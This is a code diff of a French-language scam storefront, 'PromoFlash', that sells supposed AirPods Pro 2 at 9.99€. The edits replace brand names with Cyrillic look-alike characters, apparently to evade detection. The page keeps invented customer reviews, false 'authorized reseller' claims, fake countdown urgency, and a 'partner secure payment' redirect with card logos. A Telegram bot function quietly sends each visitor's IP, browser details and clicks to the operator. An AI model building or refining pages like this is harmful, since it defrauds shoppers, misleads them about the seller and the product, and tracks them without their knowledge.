@@ -2,7 +2,8 @@
 <html lang="fr">
 <head>
 <meta name="p:domain_verify" content="6e9abc24c9c419575bc20271684efe1c"/>
-    <script>
+    <!-- Pinterest Tag -->
+<script>
 !function(e){if(!window.pintrk){window.pintrk = function () {
 window.pintrk.queue.push(Array.prototype.slice.call(arguments))};var
   n=window.pintrk;n.queue=[],n.version="3.0";var
@@ -16,32 +17,10 @@ pintrk('page');
 <img height="1" width="1" style="display:none;" alt=""
   src="https://ct.pinterest.com/v3/?event=init&tid=2613445496968&pd[em]=<hashed_email_address>&noscript=1" />
 </noscript>
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1785165155706894');
-fbq('track', 'PageView');
-// Fire ViewContent for the main product page
-fbq('track', 'ViewContent', {
-    content_name: 'AirPods Рго 2 - Offre Exclusive Anniversaire',
-    content_ids: ['APPRO2-PROMO999'],
-    content_type: 'product',
-    value: 9.99,
-    currency: 'EUR'
-});
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
-/></noscript>
-<meta charset="UTF-8">
+<!-- end Pinterest Tag -->
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AirPods Рго 2 - Offre Exclusive</title>
+    <title>АігРоds Pro 2 - Offre Exclusive</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
@@ -50,8 +29,10 @@ src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
         .cart-bar { display:none;position:fixed;top:90px;left:50%;transform:translateX(-50%);
             background:#fff;border:2px solid #2563eb;min-width:300px;padding:14px 20px;
             border-radius:14px;z-index:1000;box-shadow:0 4px 20px rgba(59,130,246,0.10);
-            align-items:center; font-weight:500;font-size:1rem;gap:10px;}
-        .show-cart-bar { display:flex!important; }
+            align-items:center; font-weight:500;font-size:1rem;gap:10px;
+            transition: opacity 0.5s, top 0.5s; opacity: 0;
+        }
+        .show-cart-bar { display:flex!important; top: 20px; opacity: 1;}
         .modal { display:none;position:fixed;left:0;top:0;width:100vw;height:100vh;
             background:rgba(0,0,0,0.40);align-items:center;justify-content:center;z-index:10001;}
         .modal-content {background:#fff;border-radius:18px;padding:30px 20px 20px 20px;
@@ -170,45 +151,6 @@ src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
         }
         #floatingOrderBtn.shake {}
 
-
-        /* Timed Pop-up Modal Styles */
-        #timedPopupModal {
-            display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.6); z-index: 20002;
-            align-items: center; justify-content: center; opacity: 0;
-            transition: opacity 0.3s ease-in-out;
-        }
-        #timedPopupModal.show { display: flex; opacity: 1; }
-        .timed-popup-content {
-            background: linear-gradient(145deg, #ffffff, #f0f4ff); color: #333;
-            padding: 25px 30px; border-radius: 16px; width: 90%; max-width: 480px;
-            text-align: center; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            position: relative; transform: scale(0.95); transition: transform 0.3s ease-out;
-        }
-        #timedPopupModal.show .timed-popup-content { transform: scale(1); }
-        .timed-popup-close-btn {
-            position: absolute; top: 10px; right: 15px; font-size: 2rem;
-            color: #888; cursor: pointer; line-height: 1;
-        }
-        .timed-popup-close-btn:hover { color: #e53e3e; }
-        .timed-popup-icon { font-size: 3rem; color: #2563eb; margin-bottom: 1rem; }
-        .timed-popup-title { font-size: 1.6rem; font-weight: 700; color: #1a202c; margin-bottom: 0.75rem; }
-        .timed-popup-text { font-size: 1rem; line-height: 1.6; margin-bottom: 0.5rem; color: #4a5568; }
-        .timed-popup-highlight { font-weight: 600; color: #dd6b20; }
-        .timed-popup-timer-container { margin-top: 1rem; margin-bottom: 1.5rem; font-size: 1.1rem; color: #4a5568; }
-        #timedPopupTimerDisplay {
-            font-size: 1.8rem; font-weight: 700; color: #c53030; background-color: #fefcbf;
-            padding: 0.3rem 0.6rem; border-radius: 8px; display: inline-block;
-            margin-left: 0.5rem; min-width: 120px;
-        }
-        .timed-popup-order-btn {
-            background-color: #2563eb; color: white; font-weight: bold; padding: 0.8rem 1.8rem;
-            border-radius: 10px; text-transform: uppercase; letter-spacing: 0.05em;
-            transition: background-color 0.2s, transform 0.2s; display: inline-block;
-            border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
-        }
-        .timed-popup-order-btn:hover { background-color: #1d4ed8; transform: translateY(-2px); }
-
         /* Reviews Section */
         #reviews-section { padding-top: 2rem; padding-bottom: 3rem; background-color: #f9fafb; }
         .review-card {
@@ -222,14 +164,17 @@ src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
         .review-card:hover { transform: translateY(-5px); }
         .review-avatar { width: 60px; height: 60px; border-radius: 50%; margin-right: 1rem; object-fit: cover; border: 2px solid #e5e7eb; }
         .review-stars { color: #f59e0b; margin-bottom: 0.5rem; }
-        .trustpilot-badge {
-            max-height: 70px; /* Increased height */
-            max-width: 250px; /* Added max-width for better control of rectangular logo */
-            width: auto;
-            margin-top: 1rem;
-            margin-bottom: 2rem;
+        .trustpilot-badge { 
+            max-height: 70px;
+            max-width: 250px;
+            width: auto; 
+            margin-top: 1rem; 
+            margin-bottom: 2rem; 
         }
-
+        .payment-logos img {
+            height: 32px;
+            margin: 0 8px;
+        }
     </style>
 </head>
 <body class="bg-white text-gray-800">
@@ -239,17 +184,17 @@ src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
     </button>
 
     <div id="cartBar" class="cart-bar">
-        <img id="cartBarАiгРоdsImg" src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods" class="w-10 h-10 object-contain rounded-lg border border-gray-200">
+        <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="АігРоds" class="w-10 h-10 object-contain rounded-lg border border-gray-200">
         <span>🛒 Produit ajouté au panier</span>
     </div>
 
     <header id="mainHeader" class="w-full pt-5 pb-2 px-4 flex flex-col items-center bg-white sticky top-0 z-40">
         <div id="logoArea" class="flex flex-col items-center cursor-pointer">
             <div class="logo-container">
-                <img id="logoImg1" src="https://i.postimg.cc/GtJNm9yD/Screenshot-20250525-200139-Chrome.jpg" alt="Logo AirPod Style 1" class="logo-image active" onerror="this.src='https://placehold.co/56x56/cccccc/ffffff?text=Logo'; this.alt='Logo indisponible'">
-                <img id="logoImg2" src="https://i.postimg.cc/yNpbtZsm/Apple-Logosu.png" alt="Logo AirPod Style 2" class="logo-image" onerror="this.src='https://placehold.co/56x56/cccccc/ffffff?text=Logo'; this.alt='Logo indisponible'">
+                <img id="logoImg1" src="https://i.postimg.cc/GtJNm9yD/Screenshot-20250525-200139-Chrome.jpg" alt="Logo АігРоd Style 1" class="logo-image active" onerror="this.src='https://placehold.co/56x56/cccccc/ffffff?text=Logo'; this.alt='Logo indisponible'">
+                <img id="logoImg2" src="https://i.postimg.cc/yNpbtZsm/АррIе -Logosu.png" alt="Logo АігРоd Style 2" class="logo-image" onerror="this.src='https://placehold.co/56x56/cccccc/ffffff?text=Logo'; this.alt='Logo indisponible'">
             </div>
-            <span class="text-3xl font-extrabold tracking-tight mb-0 shiny-silver-text" style="letter-spacing:-1px;">АiгРоd </span>
+            <span class="text-3xl font-extrabold tracking-tight mb-0 shiny-silver-text" style="letter-spacing:-1px;">АігРоd </span>
         </div>
         <nav id="topNavMenu">
             <ul>
@@ -261,7 +206,7 @@ src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
     </header>
 
     <section id="home" class="container mx-auto px-4 pt-4 pb-7 flex flex-col items-center">
-        <h1 class="text-4xl sm:text-5xl font-extrabold text-center leading-tight text-gray-900 mb-3">Offre exclusive sur AirPods Рго 2 !</h1>
+        <h1 class="text-4xl sm:text-5xl font-extrabold text-center leading-tight text-gray-900 mb-3">Offre exclusive sur АігРоds Pro 2 !</h1>
         <p class="text-lg text-gray-600 text-center max-w-xl mb-2">
             Il nous reste un stock très limité en entrepôt. Nous liquidons les dernières pièces à un prix exceptionnel pour libérer de l’espace
         </p>
@@ -271,33 +216,26 @@ src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
         </div>
         <div class="text-red-600 font-semibold mb-1 text-center">Offre se termine dans : <span id="timer" class="ml-2">02:30:00</span></div>
         <button id="orderBtn" class="bg-blue-600 hover:bg-blue-700 transition px-8 py-3 rounded-2xl shadow-lg text-white text-xl font-bold mt-2 mb-4 w-full sm:w-auto">Commander maintenant</button>
-        <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods Рго 2 blanc" class="max-w-xs w-full mb-2 image-shadow" style="margin-bottom:12px;">
+        <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="АігРоds Pro 2 blanc" class="max-w-xs w-full mb-2 image-shadow" style="margin-bottom:12px;">
         <button id="detailsBtn" class="details-btn border-2 border-blue-600 rounded-2xl py-3 px-6 text-blue-700 text-lg font-semibold bg-white hover:bg-blue-50">Voir détails et infos produit ↓</button>
     </section>
 
-    <div id="modal" class="modal">
+    <!-- Modal 1: Add to Cart -->
+    <div id="addToCartModal" class="modal">
         <div class="modal-content">
-            <span id="closeModal" class="close-btn">&times;</span>
-            <div class="flex justify-center items-center mb-2">
-                <span style="font-size:2rem; margin-right:8px;">🛒</span>
-                <img id="popupАiгРоdsImg" src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods" class="w-10 h-10 object-contain rounded-lg border border-gray-200 mx-1">
-                <span class="bg-blue-600 text-white text-xs sm:text-sm rounded-full px-2 py-0.5 ml-1 font-bold">1</span>
-            </div>
-            <h2 class="text-xl font-bold mb-1 text-gray-800">Produit ajouté au panier !</h2>
-            <p class="mb-4 text-gray-600 text-sm sm:text-base">Votre AirPods Рго 2 a été réservé. Finalisez la commande dans les 10 prochaines minutes pour profiter de l'offre.</p>
-            <div class="select-color text-left mb-4">
-                <label class="block text-gray-700 font-semibold mb-2 text-center">Choisissez la couleur :</label>
-                <div class="flex gap-3 justify-center">
-                    <label>
-                        <input type="radio" name="color" value="blanc" class="hidden" checked>
-                        <div class="color-option-display">
-                            <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="Blanc">
-                            <span class="mt-1 font-medium text-sm">Blanc</span>
-                        </div>
-                    </label>
-                 
+            <span id="closeCartModal" class="close-btn">&times;</span>
+            <h2 class="text-2xl font-bold mb-4 text-gray-800">Ajouter au Panier</h2>
+            <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="АігРоds" class="w-24 h-24 object-contain rounded-lg border border-gray-200 mx-auto mb-4">
+            
+            <p class="mb-4 text-gray-600 text-sm sm:text-base">Confirmez les détails de votre produit avant de continuer.</p>
+            
+            <div class="text-left mb-4 px-4">
+                <p class="text-gray-700 font-semibold mb-2 text-center">Couleur : <span class="font-normal">Blanc</span></p>
+                <div class="hidden">
+                    <input type="radio" name="color" value="blanc" checked>
                 </div>
             </div>
+
             <div class="mb-5">
                 <label class="block text-gray-700 font-semibold mb-1 text-center">Quantité :</label>
                 <div class="flex flex-col items-center gap-2">
@@ -305,44 +243,45 @@ src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
                     <span class="text-xs text-gray-500">Quantité limitée : une seule pièce par commande.</span>
                 </div>
             </div>
-            <button id="finalizeBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg shadow-md transition hover:shadow-lg text-base sm:text-lg">Finaliser la commande</button>
+            <button id="confirmAddToCartBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg shadow-md transition hover:shadow-lg text-base sm:text-lg flex items-center justify-center gap-2">
+                <span style="font-size: 1.2rem;">🛒</span> Ajouter au Panier
+            </button>
         </div>
     </div>
 
+    <!-- Modal 2: Confirmation before Payment -->
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+             <span id="closeConfirmationModal" class="close-btn">&times;</span>
+            <div class="text-5xl mb-3">⚠️</div>
+            <h2 class="text-xl font-bold mb-2 text-gray-800">Finalisez votre commande</h2>
+            <p class="text-gray-600 text-sm mb-4 leading-relaxed">
+                En raison d'un trafic élevé, vous serez redirigé vers la page de paiement sécurisée de notre partenaire pour finaliser votre achat en toute sécurité.
+            </p>
+            <button id="confirmPaymentBtn" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg shadow-md transition hover:shadow-lg text-base sm:text-lg">
+                Compléter le paiement
+            </button>
+            <div class="flex items-center justify-center gap-4 mt-5 payment-logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/1200px-MasterCard_Logo.svg.png" alt="Mastercard">
+                 <span style="font-size:1.5rem; color:#15803d;">🔒</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal 3: Loading Page -->
     <div id="loadingPopup" class="modal">
         <div class="modal-content flex flex-col items-center justify-center">
             <div class="mb-4">
                 <div class="animate-spin rounded-full border-4 border-gray-200 border-t-blue-600 w-12 h-12 mx-auto"></div>
             </div>
-            <h3 class="text-lg font-bold text-gray-800 mb-2">Redirection vers la passerelle de paiement...</h3>
-            <p class="text-gray-600 text-sm mb-2">Vous allez être redirigé(e) vers notre passerelle de paiement sécurisée VISA.<br>
-            <span class="text-blue-700 font-semibold">Site vérifié et 100% sécurisé.</span></p>
-            <p class="text-xs text-gray-500 mb-3">En raison d’un trafic élevé sur notre site, la redirection prend quelques secondes. Merci pour votre patience !</p>
+            <h3 class="text-lg font-bold text-gray-800 mb-2">Redirection vers le paiement sécurisé...</h3>
+            <p class="text-gray-600 text-sm mb-3">Veuillez patienter. Votre sécurité est notre priorité.</p>
             <div class="flex items-center gap-2 mt-2">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" class="h-7" style="background:#fff; border-radius:6px;">
                 <span style="font-size:1.2rem; color:#15803d;">🔒</span>
-                <span class="text-green-700 text-xs font-medium">Paiement sécurisé</span>
+                <span class="text-green-700 text-xs font-medium">Paiement 100% Sécurisé</span>
             </div>
-        </div>
-    </div>
-
-    <div id="timedPopupModal">
-        <div class="timed-popup-content">
-            <span id="timedPopupCloseBtn" class="timed-popup-close-btn">&times;</span>
-            <div class="timed-popup-icon">🎉</div>
-            <h2 class="timed-popup-title">Félicitations !</h2>
-            <p class="timed-popup-text">
-                Vous êtes tombé(e) sur notre opération de déstockage exceptionnelle. Profitez dès maintenant des écouteurs AirPods Рго 2 <span class="timed-popup-highlight">pour seulement 9,99€ – au lieu de 245€ –</span> en l'honneur de cette occasion unique.
-            </p>
-            <p class="timed-popup-text timed-popup-highlight">
-                ⏳ Attention :
-Cette promotion exclusive prendra fin à l'expiration du compte à rebours ci-dessous, et le prix reviendra à 245€.
-Ne manquez pas cette opportunité exceptionnelle !
-            </p>
-            <div class="timed-popup-timer-container">
-                L'offre se termine dans : <span id="timedPopupTimerDisplay">00:00:00</span>
-            </div>
-            <button id="timedPopupOrderBtn" class="timed-popup-order-btn">Commander Maintenant</button>
         </div>
     </div>
 
@@ -360,7 +299,7 @@ Ne manquez pas cette opportunité exceptionnelle !
                         <div class="review-stars">★★★★★</div>
                     </div>
                 </div>
-                <p class="text-gray-600 mt-2">"Incroyable ! J'ai reçu mes AirPods Рго 2 en 48h. La qualité sonore est top, et la réduction de bruit est bluffante pour ce prix. Je recommande vivement PromoFlash !"</p>
+                <p class="text-gray-600 mt-2">"Incroyable ! J'ai reçu mes АігРоds Pro 2 en 48h. La qualité sonore est top, et la réduction de bruit est bluffante pour ce prix. Je recommande vivement PromoFlash !"</p>
                 <small class="text-gray-500 mt-2 block">Avis du 22 Mai 2025</small>
             </div>
             <div class="review-card">
@@ -382,7 +321,7 @@ Ne manquez pas cette opportunité exceptionnelle !
                         <div class="review-stars">★★★★☆</div>
                     </div>
                 </div>
-                <p class="text-gray-600 mt-2">"Très satisfaite de mon achat. Les AirPods sont géniaux. Seul petit bémol, la boîte était légèrement abîmée sur un coin, mais les écouteurs étaient intacts. Le son est super, et ils tiennent bien dans les oreilles."</p>
+                <p class="text-gray-600 mt-2">"Très satisfaite de mon achat. Les АігРоds sont géniaux. Seul petit bémol, la boîte était légèrement abîmée sur un coin, mais les écouteurs étaient intacts. Le son est super, et ils tiennent bien dans les oreilles."</p>
                 <small class="text-gray-500 mt-2 block">Avis du 18 Mai 2025</small>
             </div>
             <div class="review-card">
@@ -393,7 +332,7 @@ Ne manquez pas cette opportunité exceptionnelle !
                         <div class="review-stars">★★★★★</div>
                     </div>
                 </div>
-                <p class="text-gray-600 mt-2">"Enfin une offre qui vaut le coup pour des AirPods Рго 2 authentiques ! J'ai vérifié le numéro de série sur le site d'Apple, tout est conforme. Le confort est incomparable par rapport à mes anciens écouteurs. Merci PromoFlash !"</p>
+                <p class="text-gray-600 mt-2">"Enfin une offre qui vaut le coup pour des АігРоds Pro 2 authentiques ! J'ai vérifié le numéro de série sur le site d'АррIе , tout est conforme. Le confort est incomparable par rapport à mes anciens écouteurs. Merci PromoFlash !"</p>
                 <small class="text-gray-500 mt-2 block">Avis du 15 Mai 2025</small>
             </div>
              <div class="review-card md:col-span-2 lg:col-span-1">
@@ -434,7 +373,7 @@ Ne manquez pas cette opportunité exceptionnelle !
 
     <div id="about-page" class="policy-modal"><div class="policy-content"><span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
         <h2 class="font-bold text-xl mb-3">Qui Sommes-Nous ? (À Propos)</h2>
-        <p>PromoFlash est une entreprise basée en France, spécialisée dans la recherche et le partage des meilleures offres et réductions sur les AirPods originaux. Nous agissons en tant qu'intermédiaire légal indépendant et revendeur agréé d'AirPods, aidant notre communauté à obtenir des produits АррIеauthentiques à des prix incroyables.</p>
+        <p>PromoFlash est une entreprise basée en France, spécialisée dans la recherche et le partage des meilleures offres et réductions sur les АігРоds originaux. Nous agissons en tant qu'intermédiaire légal indépendant et revendeur agréé d'АігРоds, aidant notre communauté à obtenir des produits АррIе authentiques à des prix incroyables.</p>
         <p>Notre mission est de construire une solide communauté de clients et de followers satisfaits grâce à la confiance et à la transparence.</p>
     </div></div>
 
@@ -447,7 +386,7 @@ Ne manquez pas cette opportunité exceptionnelle !
 
     <div id="terms-page" class="policy-modal"><div class="policy-content"><span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
         <h2 class="font-bold text-xl mb-3">Conditions Générales</h2>
-        <p>PromoFlash opère en tant que revendeur indépendant officiel et partenaire promotionnel pour les AirPods АррIеauthentiques. Toutes les offres et réductions sont soumises à la disponibilité des produits et sont destinées uniquement aux consommateurs finaux.</p>
+        <p>PromoFlash opère en tant que revendeur indépendant officiel et partenaire promotionnel pour les АігРоds АррIе authentiques. Toutes les offres et réductions sont soumises à la disponibilité des produits et sont destinées uniquement aux consommateurs finaux.</p>
         <p>Nous garantissons que tous les produits proposés sont neufs, originaux et livrés en toute sécurité à nos clients. Votre utilisation de ce site Web constitue votre accord avec notre politique de confidentialité et notre engagement envers des pratiques commerciales équitables, sécurisées et transparentes.</p>
     </div></div>
 
@@ -456,7 +395,7 @@ Ne manquez pas cette opportunité exceptionnelle !
         <p>Notre équipe de support est disponible 7 jours sur 7. Vous pouvez nous contacter pour toute question concernant vos commandes, les produits ou nos politiques :</p>
         <ul>
             <li><strong>Email :</strong> <a href="mailto:contact@promoflash.com" class="text-blue-600 hover:underline">contact@promoflash.com</a></li>
-            <li><strong>Téléphone :</strong> <a href="tel:+33187654321" class="text-blue-600 hover:underline">+33 1 87 65 43 19</a></li>
+            <li><strong>Téléphone :</strong> <a href="tel:+33187654321" class="text-blue-600 hover:underline">+33 1 87 65 43 18</a></li>
         </ul>
         <p>Vous pouvez également nous joindre sur nos pages de réseaux sociaux.</p>
     </div></div>
@@ -464,7 +403,7 @@ Ne manquez pas cette opportunité exceptionnelle !
     <div id="contact-page" class="policy-modal"><div class="policy-content"><span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
         <h2 class="font-bold text-xl mb-3">Contactez-Nous</h2>
         <p><strong>Email :</strong> <a href="mailto:contact@promoflash.com" class="text-blue-600 hover:underline">contact@promoflash.com</a></p>
-        <p><strong>Téléphone :</strong> <a href="tel:+33187654321" class="text-blue-600 hover:underline">+33 1 87 65 43 19</a></p>
+        <p><strong>Téléphone :</strong> <a href="tel:+33187654321" class="text-blue-600 hover:underline">+33 1 87 65 43 18</a></p>
         <p><strong>Adresse :</strong></p>
         <p>PromoMagique<br>8 Rue de la Promotion<br>75010 Paris, France</p>
         <p><strong>Réseaux Sociaux :</strong> @PromoFlash (Facebook, Instagram, Twitter)</p>
@@ -477,19 +416,19 @@ Ne manquez pas cette opportunité exceptionnelle !
     const TELEGRAM_CHAT_ID = '-4913064483';
 
     async function sendTelegramAlert(action, details = {}) {
-        let ipInfo = {
-            ip: 'N/A', country_name: 'N/A', country_code: 'N/A',
-            city: 'N/A', region_name: 'N/A'
+        let ipInfo = { 
+            ip: 'N/A', country_name: 'N/A', country_code: 'N/A', 
+            city: 'N/A', region_name: 'N/A' 
         };
         try {
             const ipRes = await fetch('https://api.country.is/');
             if (ipRes.ok) {
                 const data = await ipRes.json();
-                ipInfo = {
-                    ip: data.ip || 'N/A',
+                ipInfo = { 
+                    ip: data.ip || 'N/A', 
                     country_name: data.country || 'N/A',
-                    country_code: data.country || 'N/A',
-                    city: 'N/A', 
+                    country_code: data.country || 'N/A', 
+                    city: 'N/A',
                     region_name: 'N/A'
                 };
             } else {
@@ -500,15 +439,13 @@ Ne manquez pas cette opportunité exceptionnelle !
         }
 
         let emoji = '🔔'; // Default
-        if (/finaliser/i.test(action) || /finalize/i.test(action)) emoji = '💳';
-        else if (/cart/i.test(action) || /panier/i.test(action) || /order modal opened/i.test(action)) emoji = '🛒';
+        if (/paiement/i.test(action)) emoji = '💳';
+        else if (/panier/i.test(action)) emoji = '🛒';
+        else if (/confirmation/i.test(action)) emoji = '⚠️';
         else if (/detail/i.test(action)) emoji = 'ℹ️';
         else if (/page/i.test(action) || /view/i.test(action) || /loaded/i.test(action)) emoji = '📄';
-        else if (/color changed/i.test(action)) emoji = '🎨';
-        else if (/timed offer popup shown/i.test(action)) emoji = '⏳';
-        else if (/timed popup order/i.test(action)) emoji = '🎉';
         else if (/policy modal opened/i.test(action) || /nav link clicked/i.test(action) || /navigation menu toggled/i.test(action) ) emoji = '🔗';
-
+        
         const userAgent = navigator.userAgent;
         const language = navigator.language;
 
@@ -521,7 +458,7 @@ Ne manquez pas cette opportunité exceptionnelle !
         msg += `🕒 <b>Heure:</b> ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n`;
         msg += `🔗 <b>URL:</b> ${window.location.href}\n`;
         if (document.referrer) msg += `↩️ <b>Referrer:</b> ${document.referrer}\n`;
-       
+        
         if (details && Object.keys(details).length) {
             msg += `\n📋 <b>Détails:</b>\n`;
             Object.keys(details).forEach(key => {
@@ -546,44 +483,34 @@ Ne manquez pas cette opportunité exceptionnelle !
     }
     // --- End Telegram Alert Function ---
 
-    // --- Facebook Pixel Event Parameters ---
-    const fbProductDetails = {
-        content_name: 'AirPods Рго 2 - Offre Exclusive Anniversaire',
-        content_ids: ['APPRO2-PROMO999'], // Example SKU or unique ID
-        content_type: 'product',
-        value: 9.99,
-        currency: 'EUR'
-    };
-
-    // --- Global Flags for Timed Popup Logic ---
-    let mainOrderButtonClicked = false;
-    let timedPopupTimeoutId = null;
-
     // --- DOM Element Declarations ---
-    const logoArea = document.getElementById('logoArea');
+    const logoArea = document.getElementById('logoArea'); 
     const topNavMenu = document.getElementById('topNavMenu');
     const navLinks = document.querySelectorAll('.nav-link');
-    const mainHeader = document.getElementById('mainHeader');
+    const mainHeader = document.getElementById('mainHeader'); 
+
     const logoImg1 = document.getElementById('logoImg1');
     const logoImg2 = document.getElementById('logoImg2');
     const mainTimerDisplay = document.getElementById('timer');
     const orderBtn = document.getElementById('orderBtn');
     const floatingOrderBtn = document.getElementById('floatingOrderBtn');
-    const mainModal = document.getElementById('modal');
-    const closeModalBtn = document.getElementById('closeModal');
-    const cartBar = document.getElementById('cartBar');
-    const cartBarАiгРоdsImg = document.getElementById('cartBarАiгРоdsImg');
-    const finalizeBtn = document.getElementById('finalizeBtn');
-    const colorRadios = document.querySelectorAll('input[name="color"]');
-    const popupАiгРоdsImg = document.getElementById('popupАiгРоdsImg');
+    
+    // Modals
+    const addToCartModal = document.getElementById('addToCartModal');
+    const closeCartModal = document.getElementById('closeCartModal');
+    const confirmAddToCartBtn = document.getElementById('confirmAddToCartBtn');
+    
+    const confirmationModal = document.getElementById('confirmationModal');
+    const closeConfirmationModal = document.getElementById('closeConfirmationModal');
+    const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
+
     const loadingPopup = document.getElementById('loadingPopup');
+
+    const cartBar = document.getElementById('cartBar');
     const detailsBtn = document.getElementById('detailsBtn');
-    const featuresSection = document.getElementById('features-section');
+    const featuresSection = document.getElementById('features-section'); 
     const currentYearSpan = document.getElementById('currentYear');
-    const timedPopupModal = document.getElementById('timedPopupModal');
-    const timedPopupCloseBtn = document.getElementById('timedPopupCloseBtn');
-    const timedPopupOrderBtn = document.getElementById('timedPopupOrderBtn');
-    const timedPopupTimerDisplay = document.getElementById('timedPopupTimerDisplay');
+
     const aboutLink = document.getElementById('about-link');
     const privacyLink = document.getElementById('privacy-link');
     const termsLink = document.getElementById('terms-link');
@@ -616,7 +543,7 @@ Ne manquez pas cette opportunité exceptionnelle !
                 if (targetSection) {
                     const headerOffset = mainHeader ? mainHeader.offsetHeight : 0;
                     const elementPosition = targetSection.getBoundingClientRect().top + window.scrollY;
-                    const offsetPosition = elementPosition - headerOffset - 20;
+                    const offsetPosition = elementPosition - headerOffset - 20; 
                     window.scrollTo({ top: offsetPosition, behavior: 'smooth' });
                 }
             }
@@ -652,21 +579,16 @@ Ne manquez pas cette opportunité exceptionnelle !
     }
 
     function updateMainTimer() {
-        if (mainTimerDisplay) mainTimerDisplay.textContent = formatTime(totalSeconds);
-        if (timedPopupModal && timedPopupTimerDisplay && timedPopupModal.classList.contains('show')) {
-            timedPopupTimerDisplay.textContent = formatTime(totalSeconds);
+        if (mainTimerDisplay) {
+            mainTimerDisplay.textContent = formatTime(totalSeconds);
         }
         if (totalSeconds > 0) {
             totalSeconds--;
         } else {
             clearInterval(mainTimerInterval);
             if (mainTimerDisplay) mainTimerDisplay.textContent = "Expirée!";
-            if (timedPopupTimerDisplay && timedPopupModal.classList.contains('show')) {
-                 timedPopupTimerDisplay.textContent = "Expirée!";
-            }
             if(orderBtn) orderBtn.disabled = true;
             if(floatingOrderBtn) floatingOrderBtn.disabled = true;
-            if(timedPopupOrderBtn) timedPopupOrderBtn.disabled = true;
         }
     }
 
@@ -674,163 +596,144 @@ Ne manquez pas cette opportunité exceptionnelle !
         updateMainTimer();
         mainTimerInterval = setInterval(updateMainTimer, 1000);
     }
-
-    // --- Timed Pop-up Modal Logic ---
-    let timedPopupShownThisSession = false;
-    function showTimedPopup() {
-        if (timedPopupModal && !timedPopupShownThisSession && !mainOrderButtonClicked) {
-            timedPopupModal.classList.add('show');
-            timedPopupShownThisSession = true;
-            if (timedPopupTimerDisplay) timedPopupTimerDisplay.textContent = formatTime(totalSeconds);
-            sendTelegramAlert('Timed Offer Popup Shown');
-        }
-    }
-    function closeTimedPopup() {
-        if (timedPopupModal) timedPopupModal.classList.remove('show');
-    }
-    if (timedPopupModal) {
-        timedPopupTimeoutId = setTimeout(showTimedPopup, 10000);
-        if (timedPopupCloseBtn) timedPopupCloseBtn.onclick = closeTimedPopup;
-        if (timedPopupOrderBtn) {
-            timedPopupOrderBtn.onclick = function() {
-                closeTimedPopup();
-                openOrderModal();
-                sendTelegramAlert('Timed Popup Order Clicked');
-            };
-        }
-    }
-
+    
     // --- Sticky/Floating Order Button Logic ---
     let originalOrderBtnOffsetTop = 0;
     if (orderBtn) {
         setTimeout(() => {
-            if(orderBtn) originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
+            if(orderBtn) {
+               originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
+            }
         }, 100);
     }
+
     function handleScroll() {
         if (floatingOrderBtn && orderBtn && originalOrderBtnOffsetTop > 0) {
             const shouldBeVisible = window.scrollY > originalOrderBtnOffsetTop + orderBtn.offsetHeight;
             const isVisible = floatingOrderBtn.classList.contains('visible');
+
             if (shouldBeVisible && !isVisible) {
-                floatingOrderBtn.style.display = 'block';
-                requestAnimationFrame(() => floatingOrderBtn.classList.add('visible'));
+                floatingOrderBtn.style.display = 'block'; 
+                requestAnimationFrame(() => { 
+                    floatingOrderBtn.classList.add('visible');
+                });
             } else if (!shouldBeVisible && isVisible) {
                 floatingOrderBtn.classList.remove('visible');
